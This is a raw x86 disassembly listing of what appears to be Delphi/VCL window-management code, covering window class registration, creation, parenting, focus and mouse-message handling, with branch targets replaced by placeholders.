mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_47593c
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1e8 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x34 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x1d4 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_479ce0
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
push 0x7f00
push 0x0
call LoadCursorW
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
mov eax DefWindowProcW
mov [ ebx + 0x28 ] eax
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_4054c8
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_412610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475ab2
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_475ab8
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x100 ] edx
mov edi eax
xor eax eax
push ebp
push sub_475cb2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xcc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xac ]
cmp [ ebp - 0xb0 ] 0x0
jne r-xdata
mov eax [ ebp - 0xa4 ]
mov [ edi + 0x254 ] eax
lea eax [ ebp - 0xf4 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x98 ]
push eax
call GetClassInfoW
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0xc5 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx r-xdata
cmp edx [ ebp - 0xf0 ]
je r-xdata
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0xa4 ] r-xdata
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0xa8 ]
push eax
call RegisterClassW
test ax ax
jne r-xdata
mov eax [ ebp - 0x98 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call UnregisterClassW
mov [ rw-data ] edi
lea edx [ ebp - 0xcc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xb0 ]
cmp [ edi + 0x258 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0xfc ] eax
mov [ ebp - 0xf8 ] 0x11
lea eax [ ebp - 0xfc ]
push eax
push 0x0
lea edx [ ebp - 0x100 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x100 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_4184b8
push 0xfffffff0
mov eax [ edi + 0x258 ]
push eax
call GetWindowLongW
test eax 0x40000000
je r-xdata
call sub_4184b8
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ edi + 0x174 ]
call sub_4128f8
xor eax eax
mov [ edi + 0x174 ] eax
mov eax edi
call sub_47a06c
push 0x1
mov eax [ edi + 0x64 ]
call sub_44c204
mov ecx eax
mov edx 0x30
mov eax edi
call sub_472314
cmp [ edi + 0x5e ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ edi + 0x258 ]
push eax
call GetWindowLongW
test eax eax
jne r-xdata
mov eax ebx
call sub_479ce0
mov [ ebp - 0xb0 ] eax
jmp r-xdata
mov eax [ edi + 0xac ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edi
mov si 0xffef
call sub_40587c
mov eax [ edi + 0x258 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongW
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475cb9
lea eax [ ebp - 0x100 ]
call j_sub_4068a0
retn
test [ edi + 0x52 ] 0x20
je r-xdata
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_475cc0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_40c5c8
mov [ esi + 0x258 ] eax
pop esi
pop ebx
retn
sub_475d00
push ebx
push esi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax esi
call sub_435764
mov eax esi
call sub_4369bc
mov [ ebx + 0x264 ] eax
mov eax esi
call sub_4369bc
mov [ ebx + 0x268 ] eax
or [ ebx + 0x88 ] 0x20
xor edx edx
mov eax esi
call sub_435764
pop esi
pop ebx
retn
sub_475d3c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x264 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x268 ] eax
mov dl 0x1
mov eax esi
call sub_43af10
mov edx [ ebx + 0x264 ]
mov eax esi
call sub_439310
mov edx [ ebx + 0x268 ]
mov eax esi
call sub_439310
xor edx edx
mov eax esi
call sub_43af10
add esp 0x10
pop esi
pop ebx
retn
sub_475da8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1dc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x264 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x264
call sub_475d94
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1e0 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
movzx eax [ r-xdata ]
cmp al [ edi + 0x63 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
movzx eax [ r-xdata ]
cmp al [ edi + 0x63 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1dc ]
mov edx esi
call sub_4305a0
mov edi eax
cmp [ edi + 0x5d ] 0x0
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1e0 ]
mov edx esi
call sub_4305a0
mov edi eax
cmp [ edi + 0x5d ] 0x0
jne r-xdata
sub_475e88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_472a30
mov eax [ ebp - 0x8 ]
push eax
push sub_475d00
mov eax [ ebp - 0x8 ]
push eax
push sub_475d3c
push ebp
call sub_475da8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_475f5c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_475fc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475fc9
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfffffdff
retn
call sub_4184b8
sub_475fd8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x1e0 ]
mov edx ebx
call sub_430608
mov esi eax
inc esi
mov eax [ edi + 0x1e0 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x1e0 ]
mov edx esi
call sub_4305a0
mov eax [ eax + 0x258 ]
test eax eax
jne r-xdata
sub_476020
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x258 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb4 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x258 ]
push eax
call SetPropW
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x258 ]
push eax
call SetPropW
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax ebx
call sub_475884
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_475fd8
push eax
mov eax [ ebx + 0x258 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_475848
call sub_4702b4
inc edi
dec esi
jne r-xdata
sub_4760b8
push ebx
cmp [ eax + 0x23a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x23c ]
call [ ebx + 0x238 ]
pop ebx
retn
sub_4760dc
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
cmp [ esi + 0x242 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
push ecx
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
mov ecx edx
mov edx eax
mov eax [ esi + 0x244 ]
call [ esi + 0x240 ]
sub_47612c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp ebx [ esi ]
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_46d414
test eax eax
jne r-xdata
push 0xfffffff8
push ebx
call GetWindowLongW
cmp eax [ esi ]
jne r-xdata
push 0x0
movzx eax [ esi + 0x4 ]
push eax
push 0xb04a
push ebx
call __imp_SendMessageW
sub_476170
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x258 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1e0 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x258 ]
mov [ esp ] eax
test [ ebx + 0x55 ] 0x20
setne dl
mov [ esp + 0x4 ] dl
mov edx esp
push edx
push sub_47612c
push eax
call EnumChildWindows
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x1e0 ]
call sub_4305a0
mov edx [ eax ]
call [ edx + 0xc0 ]
inc edi
dec esi
jne r-xdata
sub_4761fc
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40587c
mov [ ebp - 0x5 ] al
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_47ba3c
xor eax eax
push ebp
push sub_476258
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
mov eax [ ebp - 0x4 ]
call sub_4763e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47625f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47ba3c
retn
sub_47625f
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop esi
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x258 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call SetFocus
sub_476288
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x59 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x8
je r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x258 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x258 ] 0x0
jne r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1ea ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1e0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xa8 ]
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x1ea ] dl
xor eax eax
push ebp
push sub_4763c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1ef ] 0x1
xor eax eax
push ebp
push sub_4763b2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_472314
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1ef ] 0x0
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1e0 ]
mov edx esi
call sub_4305a0
call sub_476288
inc esi
dec ebx
jne r-xdata
sub_4763e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
jmp r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
jne r-xdata
mov ebx esi
cmp [ ebx + 0x1ea ] 0x0
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ea ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_476288
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ef ] 0x0
jne r-xdata
cmp [ ebx + 0x1d4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1ef ] 0x1
xor eax eax
push ebp
push sub_47646c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1ea ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_472314
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1ef ] 0x0
retn
sub_4764dc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x1d4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x258 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_47ba3c
xor eax eax
push ebp
push sub_4765b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1d4 ] ebx
mov eax [ ebp - 0x4 ]
call sub_4763e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47ba3c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d4 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1d4 ] ebx
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4763e8
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov ecx 0x30003
mov edx 0x127
mov eax [ ebp - 0x4 ]
call sub_472314
sub_4765c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_476618
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_476607
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47660e
call sub_46f330
call sub_44fa18
retn
sub_476638
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0x10 ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0xc ] edx
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea eax [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
add edx 0xfffffff0
call sub_40abd8
test al al
je r-xdata
xor eax eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] ebx
cmp [ ebx + 0x59 ] 0x0
je r-xdata
cmp [ ebx + 0x59 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0xc ]
mov [ ebp - 0xc ] edx
mov esi [ ebp - 0x10 ]
and esi 0xffff
mov eax [ ebp - 0xc ]
shl eax 0x10
or esi eax
push esi
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_472314
test eax eax
setne al
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
sub_476708
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x11 ] cl
mov [ ebp - 0x8 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x1dc ]
test eax eax
je r-xdata
cmp [ esi + 0x1e0 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ esi + 0x1e0 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
test bl bl
je r-xdata
push ebp
mov edx edi
mov eax [ esi + 0x1dc ]
call sub_4305a0
call sub_476638
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
push 0x1
push 0x1
mov edx edi
mov eax [ esi + 0x1e0 ]
call sub_4305a0
mov edx [ ebp - 0x8 ]
movzx ecx [ ebp - 0x11 ]
call sub_476708
mov [ ebp - 0x18 ] eax
dec edi
cmp edi 0xffffffff
jne r-xdata
dec edi
cmp edi 0xffffffff
jne r-xdata
push ebp
mov edx edi
mov eax [ esi + 0x1e0 ]
call sub_4305a0
call sub_476638
pop ecx
test al al
jne r-xdata
sub_4767cc
push ebx
push esi
push edi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax ebx
call sub_479ce0
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ esp + 0x8 ] eax
movsx eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xa ]
mov [ esp + 0x10 ] eax
push 0x0
push 0x0
lea edx [ esp + 0x14 ]
xor ecx ecx
mov eax ebx
call sub_476708
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x1c
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x18 ] eax
mov edi [ esp + 0x14 ]
and edi 0xffff
mov eax [ esp + 0x18 ]
shl eax 0x10
or edi eax
push edi
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_472314
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x34 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_47688c
push ebx
push esi
push edi
add esp 0xfffffed8
mov ebx ecx
mov edi edx
mov esi eax
call GetMessagePos
call sub_40abc0
mov [ esp + 0x8 ] eax
movsx eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xa ]
mov [ esp + 0x10 ] eax
mov ecx esp
lea edx [ esp + 0xc ]
mov eax esi
call sub_470990
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea edx [ esp + 0x8 ]
xor ecx ecx
mov eax esi
call sub_476708
mov ebx eax
xor eax eax
cmp esi ebx
je r-xdata
mov eax [ esp ]
mov [ esp + 0x114 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x118 ] eax
mov eax [ esp ]
sub eax [ ebx + 0x40 ]
mov [ esp + 0x114 ] eax
mov eax [ esp + 0x4 ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x118 ] eax
jmp r-xdata
add eax 0xfffffdff
sub eax 0x2
jb r-xdata
add eax 0xffffff5f
sub eax 0x2
jb r-xdata
movzx eax [ edi + 0x8 ]
mov [ esp + 0x11c ] eax
mov eax [ edi + 0x4 ]
mov [ esp + 0x124 ] eax
movzx eax [ edi + 0xa ]
cmp eax 0x201
jge r-xdata
mov [ esp + 0x120 ] 0x0
jmp r-xdata
dec eax
sub eax 0x2
jb r-xdata
dec eax
sub eax 0x2
jb r-xdata
lea eax [ esp + 0x14 ]
push eax
call GetKeyboardState
lea eax [ esp + 0x14 ]
call sub_4945a0
mov esi eax
call sub_46d294
or si ax
mov [ esp + 0x121 ] si
lea eax [ esp + 0x114 ]
push eax
xor ecx ecx
mov edx 0xb04b
mov eax ebx
call sub_472314
mov [ edi + 0xc ] eax
mov al 0x1
jmp r-xdata
mov [ esp + 0x120 ] 0x1
jmp r-xdata
dec eax
sub eax 0x2
jb r-xdata
dec eax
sub eax 0x2
jb r-xdata
add esp 0x128
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x120 ] 0x2
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ esp + 0x120 ] 0x0
sub_4769e4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0x200
jge r-xdata
cmp eax 0xb047
jg r-xdata
cmp eax 0x21
jg r-xdata
sub eax 0xb04a
je r-xdata
je r-xdata
sub eax 0x84
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test al al
je r-xdata
sub eax 0x4
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4946a4
mov ebx eax
test ebx ebx
je r-xdata
add eax 0xfffffe00
sub eax 0xf
jb r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_472440
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0xffffffff
jne r-xdata
add eax 0xffffff84
sub eax 0xa
jb r-xdata
mov edx [ ebp - 0x8 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_47688c
test al al
je r-xdata
sub eax 0x7
je r-xdata
xor eax eax
push ebp
push sub_476f0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test al al
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_47ba3c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
sub eax 0x3
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_472440
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x128
jne r-xdata
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0xac ]
mov esi [ ebx + 0x8 ]
test esi esi
je r-xdata
sub eax 0x31
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
movsx eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
movsx eax [ ebp - 0x12 ]
mov [ ebp - 0x18 ] eax
push 0x0
push 0x0
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_470990
lea edx [ ebp - 0x3c ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_476708
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_471750
test al al
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4946a4
mov ebx eax
test ebx ebx
je r-xdata
dec eax
je r-xdata
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47ba3c
call sub_485c78
cmp [ eax + 0x5 ] 0x0
je r-xdata
